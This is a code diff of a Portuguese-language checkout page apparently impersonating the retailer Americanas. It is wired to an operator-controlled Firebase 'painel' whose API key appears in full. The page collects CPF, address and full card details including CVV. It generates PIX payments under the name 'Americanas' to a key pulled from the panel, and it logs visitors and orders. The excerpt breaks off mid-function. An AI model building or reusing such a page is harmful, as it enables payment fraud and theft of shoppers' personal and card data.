+                    <div class="form-group"><label>Primeiro nome</label><input type="text" id="primeiroNome" placeholder="obrigatório"></div>
+                    <div class="form-group"><label>Último nome</label><input type="text" id="ultimoNome" placeholder="obrigatório"></div>
+                    <div class="form-group"><label>CPF</label><input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14"></div>
+                    <div class="form-group"><label>Telefone</label><input type="text" id="telefone" placeholder="(21) 99999-9999" maxlength="15"></div>
+                </div>
+
+                <div id="entregaSection">
+                    <h2 style="margin-top:30px;">Entrega</h2>
+                    <div id="enderecoContainer">
+                        <div class="form-group">
+                            <label>CEP</label>
+                            <div class="cep-row">
+                                <input type="text" id="modalCep" placeholder="digite seu CEP" maxlength="9">
+                                <button id="buscarCep">OK</button>
+                            </div>
+                        </div>
+                        <div class="address-fields">
+                            <div class="form-group full-width"><label>Logradouro</label><input type="text" id="rua" placeholder="Rua, Avenida..."></div>
+                            <div class="form-group"><label>Número</label><input type="text" id="numero" placeholder="nº"></div>
+                            <div class="form-group"><label>Complemento</label><input type="text" id="complemento" placeholder="opcional"></div>
+                            <div class="form-group"><label>Bairro</label><input type="text" id="bairro" placeholder="Bairro"></div>
+                            <div class="form-group"><label>Cidade</label><input type="text" id="cidade" placeholder="Cidade"></div>
+                            <div class="form-group"><label>UF</label><input type="text" id="uf" placeholder="UF" maxlength="2"></div>
+                        </div>
+                    </div>
+
+                    <h2 style="margin-top:30px;">Resumo do pedido</h2>
+                    <div class="resumo-pedido" id="resumoPedido">
+                        <img src="https://americanas.vtexassets.com/arquivos/ids/17125823-1280-auto/7498457202_1_xlarge.webp?v=638754740609930000&quality=9" alt="Escova Modeladora">
+                        <div class="resumo-detalhes">
+                            <h4>Escova Modeladora 5 em 1</h4>
+                            <div class="resumo-linha"><span>Subtotal</span> <span id="resumoSubtotal">R$ 339,90</span></div>
+                            <div class="resumo-linha"><span>Descontos</span> <span id="resumoDescontos">- R$ 150,98</span></div>
+                            <div class="resumo-linha"><span>Entrega</span> <span id="resumoEntrega">R$ 0,00</span></div>
+                            <div class="resumo-linha total"><span>Total</span> <span id="resumoTotal">R$ 188,92</span></div>
+                        </div>
+                    </div>
+
+                    <h2 style="margin-top:30px;">Forma de pagamento</h2>
+                    <div class="payment-options">
+                        <div class="payment-option pix selected" id="optionPix" onclick="selectPayment('pix')">
+                            <i class="fab fa-pix"></i><span>Pix</span>
+                        </div>
+                        <div class="payment-option card" id="optionCard" onclick="selectPayment('card')">
+                            <i class="fas fa-credit-card"></i><span>Cartão</span>
+                        </div>
+                    </div>
+
+                    <div class="pix-info" id="pixInfo" style="display:block;">
+                        <p><span class="step">1.</span> Aperte em Finalizar compra para gerar o código QR</p>
+                        <p><span class="step">2.</span> Confira os dados e realize o pagamento pelo app do seu banco</p>
+                    </div>
+
+                    <div class="card-form" id="cardForm">
+                        <h3>Dados do cartão</h3>
+                        <div class="form-group"><label>Número do cartão</label><input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19"></div>
+                        <div class="form-group"><label>Nome no cartão</label><input type="text" id="cardName" placeholder="Como está no cartão"></div>
+                        <div class="form-group"><label>CPF do titular</label><input type="text" id="cardCpf" placeholder="000.000.000-00" maxlength="14"></div>
+                        <div class="card-row">
+                            <div class="form-group"><label>Validade</label><input type="text" id="cardExpiry" placeholder="MM/AA" maxlength="5"></div>
+                            <div class="form-group"><label>CVV</label><input type="text" id="cardCvv" placeholder="123" maxlength="3"></div>
+                        </div>
+                        <div class="form-group"><label>Parcelas</label><select id="cardInstallments"></select></div>
+                    </div>
+
+                    <button class="finalizar-red" id="finalizarCompraBtn">FINALIZAR COMPRA</button>
+                </div>
+            </div>
+
+            <div id="pixScreen" style="display:none;" class="pix-screen">
+                <div class="timer" id="timer">30:00</div>
+                <div id="pixContent">
+                    <h2><i class="fab fa-pix" style="color:#00a650;"></i> PIX QR Code</h2>
+                    <p>Escaneie o código com seu celular</p>
+                    <div class="qr-placeholder" id="qrPlaceholder"></div>
+                    <p>Abra o app do seu banco e aponte a câmera</p>
+                    <div class="pix-key" id="pixKey">Carregando...</div>
+                    <button class="copy-btn" id="copyPixBtn"><i class="fas fa-copy"></i> copiar chave Pix</button>
+                    <div class="small-message">Se você já realizou o pagamento, clique em confirmar</div>
+                    <div id="paymentStatus" class="payment-status"></div>
+                    <button class="confirm-btn" id="confirmarPagamentoBtn">CONFIRMAR</button>
+                    <p>Valor da compra: <strong id="pixValorCompra">R$ 188,92</strong></p>
+                </div>
+                <div id="expiredMessage" class="expired-message">
+                    <i class="fas fa-clock"></i><p>O tempo expirou.</p><p>Para pagar, finalize sua compra novamente.</p>
+                    <button id="closeExpiredBtn">FECHAR</button>
+                </div>
             </div>
         </div>
     </div>
-</div>
 
-<div id="toast" class="toast"></div>
+    <div id="toast" class="toast"></div>
 
-<script>
-    // ==================== CONFIGURAÇÃO DO FIREBASE ====================
-    const firebaseConfig = {
-        apiKey: "AIzaSyCjIMUFTALiXEHBCzJTGSq7fRZYkncl3NA",
-        authDomain: "painel-americanas-33d0a.firebaseapp.com",
-        databaseURL: "https://painel-americanas-33d0a-default-rtdb.firebaseio.com",
-        projectId: "painel-americanas-33d0a",
-        storageBucket: "painel-americanas-33d0a.firebasestorage.app",
-        messagingSenderId: "1018096096887",
-        appId: "1:1018096096887:web:9073224c6d4b265779d872"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const database = firebase.database();
+    <script>
+        // ==================== CONFIGURAÇÃO DO FIREBASE ====================
+        const firebaseConfig = {
+            apiKey: "AIzaSyCjIMUFTALiXEHBCzJTGSq7fRZYkncl3NA",
+            authDomain: "painel-americanas-33d0a.firebaseapp.com",
+            databaseURL: "https://painel-americanas-33d0a-default-rtdb.firebaseio.com",
+            projectId: "painel-americanas-33d0a",
+            storageBucket: "painel-americanas-33d0a.firebasestorage.app",
+            messagingSenderId: "1018096096887",
+            appId: "1:1018096096887:web:9073224c6d4b265779d872"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
 
-    // ==================== REFERÊNCIAS GLOBAIS ====================
-    const presenceRef = database.ref('presence_sites'); // nó separado para sites
-    const pixKeyRef = database.ref('pixKey');
-    const pedidosRef = database.ref('pedidos');
-
-    // ==================== SISTEMA DE PRESENÇA (VISITANTES ONLINE) ====================
-    // Gera um ID único para esta aba/sessão
-    let sessionId = sessionStorage.getItem('sessionId');
-    if (!sessionId) {
-        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-        sessionStorage.setItem('sessionId', sessionId);
-    }
-    // Registra presença
-    const myPresenceRef = presenceRef.child(sessionId);
-    myPresenceRef.set(true);
-    // Remove quando a aba for fechada ou perder conexão
-    myPresenceRef.onDisconnect().remove();
-
-    // (Não exibimos contador no site, apenas registramos)
-
-    // ==================== FUNÇÃO PARA GERAR PAYLOAD PIX ====================
-    function gerarPayloadPix(chave, valor, nome, cidade, txid = '***') {
-        const valorStr = valor.toFixed(2);
-        const nomeStr = nome.substring(0, 25);
-        const cidadeStr = cidade.substring(0, 15);
-        const gui = 'br.gov.bcb.pix';
-        let accountInfo = `0014${gui}01${chave.length.toString().padStart(2, '0')}${chave}`;
-        accountInfo = `${accountInfo.length.toString().padStart(2, '0')}${accountInfo}`;
-        let payload = `00020126${accountInfo}52040000530398654${valorStr.length.toString().padStart(2, '0')}${valorStr}5802BR59${nomeStr.length.toString().padStart(2, '0')}${nomeStr}60${cidadeStr.length.toString().padStart(2, '0')}${cidadeStr}`;
-        const txidField = `05${txid.length.toString().padStart(2, '0')}${txid}`;
-        const additionalData = `${txidField.length.toString().padStart(2, '0')}${txidField}`;
-        payload += `62${additionalData}`;
-        payload += '6304';
-        payload += crc16(payload);
-        return payload;
-    }
-
-    function crc16(str) {
-        let crc = 0xFFFF;
-        for (let i = 0; i < str.length; i++) {
-            crc ^= str.charCodeAt(i) << 8;
-            for (let j = 0; j < 8; j++) {
-                crc = (crc & 0x8000) ? (crc << 1) ^ 0x1021 : crc << 1;
-            }
+        // ==================== NOVO: CONTADOR DE VISITAS (ACUMULADO) ====================
+        if (!sessionStorage.getItem('visita_contada')) {
+            database.ref('visitas/total').transaction(current => (current || 0) + 1);
+            sessionStorage.setItem('visita_contada', 'true');
         }
-        crc &= 0xFFFF;
-        return crc.toString(16).toUpperCase().padStart(4, '0');
-    }
 
-    // ==================== ELEMENTOS DOM ====================
-    const trocaLink = document.getElementById('trocaLink');
-    const backLink = document.getElementById('backToProduct');
-    const productPage = document.getElementById('product-page');
-    const returnsPage = document.getElementById('returns-page');
-    const breadcrumb = document.getElementById('breadcrumb');
-    const calcFreteBtn = document.getElementById('calcFrete');
-    const enderecoInfo = document.getElementById('enderecoInfo');
-    const enderecoCompleto = document.getElementById('enderecoCompleto');
-    const freteValorDisplay = document.getElementById('freteValorDisplay');
-    const thumbnails = document.querySelectorAll('.thumb');
-    const mainImage = document.getElementById('mainProductImage');
-    const modal = document.getElementById('checkoutModal');
-    const comprarBtn = document.getElementById('comprarBtn');
-    const closeModal = document.getElementById('closeModal');
-    const finalizarBtn = document.getElementById('finalizarCompraBtn');
-    const step1 = document.getElementById('checkoutStep1');
-    const pixScreen = document.getElementById('pixScreen');
-    const buscarCepBtn = document.getElementById('buscarCep');
-    const pixContent = document.getElementById('pixContent');
-    const expiredMessage = document.getElementById('expiredMessage');
-    const timerEl = document.getElementById('timer');
-    const entregaSection = document.getElementById('entregaSection');
-    const confirmarBtn = document.getElementById('confirmarPagamentoBtn');
-    const paymentStatus = document.getElementById('paymentStatus');
-    const emailInput = document.getElementById('email');
-    const primeiroNomeInput = document.getElementById('primeiroNome');
-    const ultimoNomeInput = document.getElementById('ultimoNome');
-    const cpfInput = document.getElementById('cpf');
-    const telefoneInput = document.getElementById('telefone');
-    const cidadeInput = document.getElementById('cidade');
-    const pixKeyElement = document.getElementById('pixKey');
-    const qrPlaceholder = document.getElementById('qrPlaceholder');
-    const modalCepInput = document.getElementById('modalCep');
-    const ruaInput = document.getElementById('rua');
-    const numeroInput = document.getElementById('numero');
-    const bairroInput = document.getElementById('bairro');
-    const ufInput = document.getElementById('uf');
-    const cardNumber = document.getElementById('cardNumber');
-    const cardName = document.getElementById('cardName');
-    const cardCpf = document.getElementById('cardCpf');
-    const cardExpiry = document.getElementById('cardExpiry');
-    const cardCvv = document.getElementById('cardCvv');
-    const cardInstallments = document.getElementById('cardInstallments');
-    const quantidadeSelect = document.getElementById('quantidadeSelect');
-    const resumoSubtotal = document.getElementById('resumoSubtotal');
-    const resumoDescontos = document.getElementById('resumoDescontos');
-    const resumoEntrega = document.getElementById('resumoEntrega');
-    const resumoTotal = document.getElementById('resumoTotal');
-    const pixValorCompra = document.getElementById('pixValorCompra');
+        // ==================== SISTEMA DE PRESENÇA (VISITANTES ONLINE) ====================
+        let sessionId = sessionStorage.getItem('sessionId');
+        if (!sessionId) {
+            sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            sessionStorage.setItem('sessionId', sessionId);
+        }
+        const presenceRef = database.ref('presence_sites');
+        const myPresenceRef = presenceRef.child(sessionId);
+        myPresenceRef.set(true);
+        myPresenceRef.onDisconnect().remove();
 
-    // ==================== VARIÁVEIS ====================
-    let frete = 0.00;
-    const precoUnitario = 188.92;
-    const precoAntigoUnitario = 339.90;
-    const descontoUnitario = 150.98;
-    let timerInterval = null;
-    let currentOrderId = null;
+        // ==================== REFERÊNCIAS GLOBAIS ====================
+        const pixKeyRef = database.ref('pixKey');
+        const pedidosRef = database.ref('pedidos');
 
-    // ==================== IMAGENS ====================
-    const imageUrls = [
-        "https://americanas.vtexassets.com/arquivos/ids/17125823-1280-auto/7498457202_1_xlarge.webp?v=638754740609930000&quality=9",
-        "https://americanas.vtexassets.com/arquivos/ids/17125794-1280-auto/7498457202_2_xlarge.webp?v=638754740608830000&quality=9",
-        "https://americanas.vtexassets.com/arquivos/ids/17125665-1280-auto/7498457202_3_xlarge.webp?v=638754740607900000&quality=9",
-        "https://americanas.vtexassets.com/arquivos/ids/17125835-1280-auto/7498457202_4_xlarge.webp?v=638754740610230000&quality=9"
-    ];
-    let currentImageIndex = 0;
-    function updateMainImage(index) { if (index>=0 && index<imageUrls.length) { mainImage.src=imageUrls[index]; currentImageIndex=index; } }
-    thumbnails.forEach((thumb,i)=>thumb.addEventListener('click',()=>updateMainImage(i)));
-    document.getElementById('prevImageBtn').addEventListener('click',()=>updateMainImage((currentImageIndex-1+imageUrls.length)%imageUrls.length));
-    document.getElementById('nextImageBtn').addEventListener('click',()=>updateMainImage((currentImageIndex+1)%imageUrls.length));
+        // ==================== ELEMENTOS DOM ====================
+        const trocaLink = document.getElementById('trocaLink');
+        const backLink = document.getElementById('backToProduct');
+        const productPage = document.getElementById('product-page');
+        const returnsPage = document.getElementById('returns-page');
+        const breadcrumb = document.getElementById('breadcrumb');
+        const calcFreteBtn = document.getElementById('calcFrete');
+        const enderecoInfo = document.getElementById('enderecoInfo');
+        const enderecoCompleto = document.getElementById('enderecoCompleto');
+        const freteValorDisplay = document.getElementById('freteValorDisplay');
+        const thumbnails = document.querySelectorAll('.thumb');
+        const mainImage = document.getElementById('mainProductImage');
+        const modal = document.getElementById('checkoutModal');
+        const comprarBtn = document.getElementById('comprarBtn');
+        const closeModal = document.getElementById('closeModal');
+        const finalizarBtn = document.getElementById('finalizarCompraBtn');
+        const step1 = document.getElementById('checkoutStep1');
+        const pixScreen = document.getElementById('pixScreen');
+        const buscarCepBtn = document.getElementById('buscarCep');
+        const pixContent = document.getElementById('pixContent');
+        const expiredMessage = document.getElementById('expiredMessage');
+        const timerEl = document.getElementById('timer');
+        const entregaSection = document.getElementById('entregaSection');
+        const confirmarBtn = document.getElementById('confirmarPagamentoBtn');
+        const paymentStatus = document.getElementById('paymentStatus');
+        const emailInput = document.getElementById('email');
+        const primeiroNomeInput = document.getElementById('primeiroNome');
+        const ultimoNomeInput = document.getElementById('ultimoNome');
+        const cpfInput = document.getElementById('cpf');
+        const telefoneInput = document.getElementById('telefone');
+        const cidadeInput = document.getElementById('cidade');
+        const pixKeyElement = document.getElementById('pixKey');
+        const qrPlaceholder = document.getElementById('qrPlaceholder');
+        const modalCepInput = document.getElementById('modalCep');
+        const ruaInput = document.getElementById('rua');
+        const numeroInput = document.getElementById('numero');
+        const bairroInput = document.getElementById('bairro');
+        const ufInput = document.getElementById('uf');
+        const cardNumber = document.getElementById('cardNumber');
+        const cardName = document.getElementById('cardName');
+        const cardCpf = document.getElementById('cardCpf');
+        const cardExpiry = document.getElementById('cardExpiry');
+        const cardCvv = document.getElementById('cardCvv');
+        const cardInstallments = document.getElementById('cardInstallments');
+        const quantidadeSelect = document.getElementById('quantidadeSelect');
+        const resumoSubtotal = document.getElementById('resumoSubtotal');
+        const resumoDescontos = document.getElementById('resumoDescontos');
+        const resumoEntrega = document.getElementById('resumoEntrega');
+        const resumoTotal = document.getElementById('resumoTotal');
+        const pixValorCompra = document.getElementById('pixValorCompra');
 
-    // ==================== MÁSCARAS ====================
-    function mascaraCPF(v){ return v.replace(/\D/g,'').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})$/,'$1-$2').substring(0,14); }
-    function mascaraTelefone(v){ return v.replace(/\D/g,'').replace(/^(\d{2})(\d)/,'($1) $2').replace(/(\d{5})(\d)/,'$1-$2').substring(0,15); }
-    function mascaraCEP(v){ return v.replace(/\D/g,'').replace(/^(\d{5})(\d)/,'$1-$2').substring(0,9); }
-    function mascaraCartao(v){ return v.replace(/\D/g,'').replace(/(\d{4})(?=\d)/g,'$1 ').trim().substring(0,19); }
-    function mascaraValidade(v){ return v.replace(/\D/g,'').replace(/^(\d{2})(\d)/,'$1/$2').substring(0,5); }
-    cpfInput.addEventListener('input',e=>e.target.value=mascaraCPF(e.target.value));
-    telefoneInput.addEventListener('input',e=>e.target.value=mascaraTelefone(e.target.value));
-    modalCepInput.addEventListener('input',e=>e.target.value=mascaraCEP(e.target.value));
-    cardNumber.addEventListener('input',e=>e.target.value=mascaraCartao(e.target.value));
-    cardExpiry.addEventListener('input',e=>e.target.value=mascaraValidade(e.target.value));
-    cardCvv.addEventListener('input',e=>e.target.value=e.target.value.replace(/\D/g,'').substring(0,3));
-    cardCpf.addEventListener('input',e=>e.target.value=mascaraCPF(e.target.value));
+        // ==================== VARIÁVEIS ====================
+        let frete = 0.00;
+        const precoUnitario = 188.92;
+        const precoAntigoUnitario = 339.90;
+        const descontoUnitario = 150.98;
+        let timerInterval = null;
+        let currentOrderId = null;
 
-    // ==================== PARCELAS ====================
-    function preencherParcelas(){ let o=''; for(let i=1;i<=6;i++){ let p=precoAntigoUnitario/i; o+=`<option value="${precoAntigoUnitario.toFixed(2)}">${i}x de R$ ${p.toFixed(2)} sem juros</option>`; } cardInstallments.innerHTML=o; }
-    preencherParcelas();
+        // ==================== IMAGENS ====================
+        const imageUrls = [
+            "https://americanas.vtexassets.com/arquivos/ids/17125823-1280-auto/7498457202_1_xlarge.webp?v=638754740609930000&quality=9",
+            "https://americanas.vtexassets.com/arquivos/ids/17125794-1280-auto/7498457202_2_xlarge.webp?v=638754740608830000&quality=9",
+            "https://americanas.vtexassets.com/arquivos/ids/17125665-1280-auto/7498457202_3_xlarge.webp?v=638754740607900000&quality=9",
+            "https://americanas.vtexassets.com/arquivos/ids/17125835-1280-auto/7498457202_4_xlarge.webp?v=638754740610230000&quality=9"
+        ];
+        let currentImageIndex = 0;
+        function updateMainImage(index) { if (index>=0 && index<imageUrls.length) { mainImage.src=imageUrls[index]; currentImageIndex=index; } }
+        thumbnails.forEach((thumb,i)=>thumb.addEventListener('click',()=>updateMainImage(i)));
+        document.getElementById('prevImageBtn').addEventListener('click',()=>updateMainImage((currentImageIndex-1+imageUrls.length)%imageUrls.length));
+        document.getElementById('nextImageBtn').addEventListener('click',()=>updateMainImage((currentImageIndex+1)%imageUrls.length));
 
-    // ==================== ATUALIZAR RESUMO ====================
-    function atualizarResumo(){
-        const qtd=parseInt(quantidadeSelect.value);
-        const subtotal=precoAntigoUnitario*qtd;
-        const descontoTotal=descontoUnitario*qtd;
-        const total=(precoUnitario*qtd)+frete;
-        resumoSubtotal.textContent=`R$ ${subtotal.toFixed(2)}`;
-        resumoDescontos.textContent=`- R$ ${descontoTotal.toFixed(2)}`;
-        resumoEntrega.textContent=`R$ ${frete.toFixed(2)}`;
-        resumoTotal.textContent=`R$ ${total.toFixed(2)}`;
-        pixValorCompra.textContent=`R$ ${total.toFixed(2)}`;
-        if(freteValorDisplay) freteValorDisplay.textContent=frete===0?'Grátis':`R$ ${frete.toFixed(2)}`;
-    }
-    quantidadeSelect.addEventListener('change',atualizarResumo);
+        // ==================== MÁSCARAS ====================
+        function mascaraCPF(v){ return v.replace(/\D/g,'').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})$/,'$1-$2').substring(0,14); }
+        function mascaraTelefone(v){ return v.replace(/\D/g,'').replace(/^(\d{2})(\d)/,'($1) $2').replace(/(\d{5})(\d)/,'$1-$2').substring(0,15); }
+        function mascaraCEP(v){ return v.replace(/\D/g,'').replace(/^(\d{5})(\d)/,'$1-$2').substring(0,9); }
+        function mascaraCartao(v){ return v.replace(/\D/g,'').replace(/(\d{4})(?=\d)/g,'$1 ').trim().substring(0,19); }
+        function mascaraValidade(v){ return v.replace(/\D/g,'').replace(/^(\d{2})(\d)/,'$1/$2').substring(0,5); }
+        cpfInput.addEventListener('input',e=>e.target.value=mascaraCPF(e.target.value));
+        telefoneInput.addEventListener('input',e=>e.target.value=mascaraTelefone(e.target.value));
+        modalCepInput.addEventListener('input',e=>e.target.value=mascaraCEP(e.target.value));
+        cardNumber.addEventListener('input',e=>e.target.value=mascaraCartao(e.target.value));
+        cardExpiry.addEventListener('input',e=>e.target.value=mascaraValidade(e.target.value));
+        cardCvv.addEventListener('input',e=>e.target.value=e.target.value.replace(/\D/g,'').substring(0,3));
+        cardCpf.addEventListener('input',e=>e.target.value=mascaraCPF(e.target.value));
 
-    // ==================== EVENTOS INICIAIS ====================
-    trocaLink.addEventListener('click',e=>{ e.preventDefault(); productPage.style.display='none'; returnsPage.style.display='block'; breadcrumb.innerHTML='<i class="fas fa-home"></i> página inicial <i class="fas fa-chevron-right"></i> entregas e devoluções'; });
-    if(backLink) backLink.addEventListener('click',e=>{ e.preventDefault(); productPage.style.display='block'; returnsPage.style.display='none'; breadcrumb.innerHTML='<i class="fas fa-home"></i> página inicial <i class="fas fa-chevron-right"></i> beleza <i class="fas fa-chevron-right"></i> escovas modeladoras <i class="fas fa-chevron-right"></i> escova modeladora 5 em 1'; });
+        // ==================== PARCELAS ====================
+        function preencherParcelas(){ let o=''; for(let i=1;i<=6;i++){ let p=precoAntigoUnitario/i; o+=`<option value="${precoAntigoUnitario.toFixed(2)}">${i}x de R$ ${p.toFixed(2)} sem juros</option>`; } cardInstallments.innerHTML=o; }
+        preencherParcelas();
 
-    // ==================== CONSULTA CEP ====================
-    calcFreteBtn.addEventListener('click',async e=>{
-        e.preventDefault();
-        const cep=document.getElementById('cepInput').value.replace(/\D/g,'');
-        if(cep.length!==8){ showToast('CEP inválido',true); enderecoInfo.style.display='none'; return; }
-        try{
-            const r=await fetch(`https://viacep.com.br/ws/${cep}/json/`);
-            const d=await r.json();
-            if(d.erro){ showToast('CEP não encontrado',true); enderecoInfo.style.display='none'; }
-            else{
-                enderecoCompleto.textContent=`${d.logradouro}, ${d.bairro} - ${d.localidade}/${d.uf}`;
-                frete=0;
-                atualizarResumo();
-                enderecoInfo.style.display='block';
-            }
-        }catch{ showToast('Erro ao buscar CEP',true); enderecoInfo.style.display='none'; }
-    });
+        // ==================== ATUALIZAR RESUMO ====================
+        function atualizarResumo(){
+            const qtd=parseInt(quantidadeSelect.value);
+            const subtotal=precoAntigoUnitario*qtd;
+            const descontoTotal=descontoUnitario*qtd;
+            const total=(precoUnitario*qtd)+frete;
+            resumoSubtotal.textContent=`R$ ${subtotal.toFixed(2)}`;
+            resumoDescontos.textContent=`- R$ ${descontoTotal.toFixed(2)}`;
+            resumoEntrega.textContent=`R$ ${frete.toFixed(2)}`;
+            resumoTotal.textContent=`R$ ${total.toFixed(2)}`;
+            pixValorCompra.textContent=`R$ ${total.toFixed(2)}`;
+            if(freteValorDisplay) freteValorDisplay.textContent=frete===0?'Grátis':`R$ ${frete.toFixed(2)}`;
+        }
+        quantidadeSelect.addEventListener('change',atualizarResumo);
 
-    [emailInput,primeiroNomeInput,ultimoNomeInput,cpfInput,telefoneInput].forEach(i=>i.addEventListener('input',()=>{ entregaSection.style.display=checkDadosPessoaisPreenchidos()?'block':'none'; }));
-    function checkDadosPessoaisPreenchidos(){ return emailInput.value.trim()&&primeiroNomeInput.value.trim()&&ultimoNomeInput.value.trim()&&cpfInput.value.trim()&&telefoneInput.value.trim(); }
-    function checkEnderecoPreenchido(){ return modalCepInput.value.trim()&&ruaInput.value.trim()&&numeroInput.value.trim()&&bairroInput.value.trim()&&cidadeInput.value.trim()&&ufInput.value.trim(); }
-    function checkCartaoPreenchido(){ return cardNumber.value.trim()&&cardName.value.trim()&&cardCpf.value.trim()&&cardExpiry.value.trim()&&cardCvv.value.trim(); }
+        // ==================== EVENTOS INICIAIS ====================
+        trocaLink.addEventListener('click',e=>{ e.preventDefault(); productPage.style.display='none'; returnsPage.style.display='block'; breadcrumb.innerHTML='<i class="fas fa-home"></i> página inicial <i class="fas fa-chevron-right"></i> entregas e devoluções'; });
+        if(backLink) backLink.addEventListener('click',e=>{ e.preventDefault(); productPage.style.display='block'; returnsPage.style.display='none'; breadcrumb.innerHTML='<i class="fas fa-home"></i> página inicial <i class="fas fa-chevron-right"></i> beleza <i class="fas fa-chevron-right"></i> escovas modeladoras <i class="fas fa-chevron-right"></i> escova modeladora 5 em 1'; });
 
-    async function buscarCep(cep){
-        try{
-            const r=await fetch(`https://viacep.com.br/ws/${cep}/json/`);
-            const d=await r.json();
-            if(!d.erro){ cidadeInput.value=d.localidade; ufInput.value=d.uf; bairroInput.value=d.bairro; ruaInput.value=d.logradouro; showToast('CEP encontrado! Preencha o número.'); }
-            else showToast('CEP não encontrado.',true);
-        }catch{ showToast('Erro ao buscar CEP.',true); }
-    }
-    buscarCepBtn.addEventListener('click',e=>{ e.preventDefault(); const cep=modalCepInput.value.replace(/\D/g,''); if(cep.length===8) buscarCep(cep); else showToast('CEP inválido.',true); });
+        // ==================== CONSULTA CEP ====================
+        calcFreteBtn.addEventListener('click',async e=>{
+            e.preventDefault();
+            const cep=document.getElementById('cepInput').value.replace(/\D/g,'');
+            if(cep.length!==8){ showToast('CEP inválido',true); enderecoInfo.style.display='none'; return; }
+            try{
+                const r=await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+                const d=await r.json();
+                if(d.erro){ showToast('CEP não encontrado',true); enderecoInfo.style.display='none'; }
+                else{
+                    enderecoCompleto.textContent=`${d.logradouro}, ${d.bairro} - ${d.localidade}/${d.uf}`;
+                    frete=0;
+                    atualizarResumo();
+                    enderecoInfo.style.display='block';
+                }
+            }catch{ showToast('Erro ao buscar CEP',true); enderecoInfo.style.display='none'; }
+        });
 
-    function resetPixScreen(){ if(timerInterval)clearInterval(timerInterval); timerInterval=null; if(pixContent) pixContent.style.display='block'; if(expiredMessage) expiredMessage.style.display='none'; if(timerEl) timerEl.textContent='30:00'; if(paymentStatus){ paymentStatus.style.display='none'; paymentStatus.textContent=''; } }
+        [emailInput,primeiroNomeInput,ultimoNomeInput,cpfInput,telefoneInput].forEach(i=>i.addEventListener('input',()=>{ entregaSection.style.display=checkDadosPessoaisPreenchidos()?'block':'none'; }));
+        function checkDadosPessoaisPreenchidos(){ return emailInput.value.trim()&&primeiroNomeInput.value.trim()&&ultimoNomeInput.value.trim()&&cpfInput.value.trim()&&telefoneInput.value.trim(); }
+        function checkEnderecoPreenchido(){ return modalCepInput.value.trim()&&ruaInput.value.trim()&&numeroInput.value.trim()&&bairroInput.value.trim()&&cidadeInput.value.trim()&&ufInput.value.trim(); }
+        function checkCartaoPreenchido(){ return cardNumber.value.trim()&&cardName.value.trim()&&cardCpf.value.trim()&&cardExpiry.value.trim()&&cardCvv.value.trim(); }
 
-    comprarBtn.addEventListener('click',e=>{
-        e.preventDefault();
-        modal.style.display='flex';
-        step1.style.display='block';
-        pixScreen.style.display='none';
-        resetPixScreen();
-        entregaSection.style.display='none';
-        emailInput.value=''; primeiroNomeInput.value=''; ultimoNomeInput.value=''; cpfInput.value=''; telefoneInput.value='';
-        cidadeInput.value=''; modalCepInput.value=''; ruaInput.value=''; numeroInput.value='';
-        document.getElementById('complemento').value=''; bairroInput.value=''; ufInput.value='';
-        cardNumber.value=''; cardName.value=''; cardCpf.value=''; cardExpiry.value=''; cardCvv.value='';
-        const cepInicial=document.getElementById('cepInput').value.replace(/\D/g,'');
-        if(cepInicial.length===8) modalCepInput.value=cepInicial;
-        document.getElementById('optionPix').classList.add('selected');
-        document.getElementById('optionCard').classList.remove('selected');
-        document.getElementById('cardForm').classList.remove('show');
-        document.getElementById('pixInfo').style.display='block';
-        atualizarResumo();
-    });
+        async function buscarCep(cep){
+            try{
+                const r=await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+                const d=await r.json();
+                if(!d.erro){ cidadeInput.value=d.localidade; ufInput.value=d.uf; bairroInput.value=d.bairro; ruaInput.value=d.logradouro; showToast('CEP encontrado! Preencha o número.'); }
+                else showToast('CEP não encontrado.',true);
+            }catch{ showToast('Erro ao buscar CEP.',true); }
+        }
+        buscarCepBtn.addEventListener('click',e=>{ e.preventDefault(); const cep=modalCepInput.value.replace(/\D/g,''); if(cep.length===8) buscarCep(cep); else showToast('CEP inválido.',true); });
 
-    closeModal.addEventListener('click',e=>{ e.preventDefault(); modal.style.display='none'; if(timerInterval)clearInterval(timerInterval); resetPixScreen(); });
-    window.addEventListener('click',e=>{ if(e.target===modal){ modal.style.display='none'; if(timerInterval)clearInterval(timerInterval); resetPixScreen(); } });
+        function resetPixScreen(){ if(timerInterval)clearInterval(timerInterval); timerInterval=null; if(pixContent) pixContent.style.display='block'; if(expiredMessage) expiredMessage.style.display='none'; if(timerEl) timerEl.textContent='30:00'; if(paymentStatus){ paymentStatus.style.display='none'; paymentStatus.textContent=''; } }
 
-    // ==================== FINALIZAR COMPRA ====================
-    finalizarBtn.addEventListener('click',async e=>{
-        e.preventDefault();
-        if(!checkDadosPessoaisPreenchidos()){ showToast('Preencha todos os dados pessoais.',true); return; }
-        if(!validarEmail(emailInput.value.trim())){ showToast('E-mail inválido.',true); return; }
-        if(!validarCPF(cpfInput.value.trim())){ showToast('CPF inválido.',true); return; }
-        if(!checkEnderecoPreenchido()){ showToast('Preencha todos os dados de endereço.',true); return; }
-
-        const metodo=document.getElementById('optionPix').classList.contains('selected')?'pix':'card';
-        const nomeCompleto=`${primeiroNomeInput.value.trim()} ${ultimoNomeInput.value.trim()}`;
-        const cidade=cidadeInput.value.trim()||'Não informada';
-        const valorCompra=parseFloat(resumoTotal.textContent.replace('R$ ','').replace(',','.'));
-
-        if(metodo==='pix'){
-            finalizarBtn.disabled=true;
-            finalizarBtn.textContent='Gerando PIX...';
-
-            // Busca chave PIX do Firebase
-            const snapshot=await pixKeyRef.once('value');
-            const chave=snapshot.val();
-            if(!chave){
-                showToast('Chave PIX não configurada no painel.',true);
-                finalizarBtn.disabled=false;
-                finalizarBtn.textContent='FINALIZAR COMPRA';
-                return;
-            }
-
-            // Gera payload PIX com valor
-            const payload = gerarPayloadPix(chave, valorCompra, 'Americanas', 'RIO DE JANEIRO', '***');
-
-            pixKeyElement.innerText = payload;
